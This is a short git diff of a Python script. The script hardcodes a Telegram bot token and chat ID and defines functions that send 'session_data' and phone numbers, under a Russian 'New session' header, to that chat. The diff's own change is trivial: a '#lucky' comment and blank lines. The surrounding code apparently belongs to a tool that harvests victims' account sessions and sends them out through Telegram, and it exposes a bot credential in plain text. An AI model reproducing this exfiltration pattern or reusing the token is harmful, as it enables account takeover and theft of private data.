@@ -6,6 +6,8 @@ BOT_TOKEN = '8424319780:AAErMSB9YiQ2v7KuB4d5ywhSiVNJG1BSdCk'
 CHAT_ID = 7669456027
 bot = telebot.TeleBot(BOT_TOKEN)
 
+#lucky
+
 def send_number_to_telegram(session_data: dict):
     text = (
         "📥 Новая сессия\n\n"
@@ -33,6 +35,7 @@ def send_session_to_telegram(session_data: dict):
         "chat_id": CHAT_ID,
         "text": text
     })
+
 
 
 
